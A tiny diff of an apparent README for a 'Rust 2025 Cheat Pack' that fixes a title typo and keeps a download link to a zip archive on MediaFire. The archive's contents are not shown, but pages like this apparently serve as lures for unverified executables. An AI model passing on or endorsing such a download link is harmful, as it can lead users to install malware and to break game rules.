@@ -1,4 +1,4 @@
-# 🔥 Rast 2025 Cheat Pack
+# 🔥 Rust 2025 Cheat Pack
 
 Download --- [Rast Cheat](https://www.mediafire.com/file/m8qga4qo9cv4cmt/Fc_Cheat_1.zip/file)
 
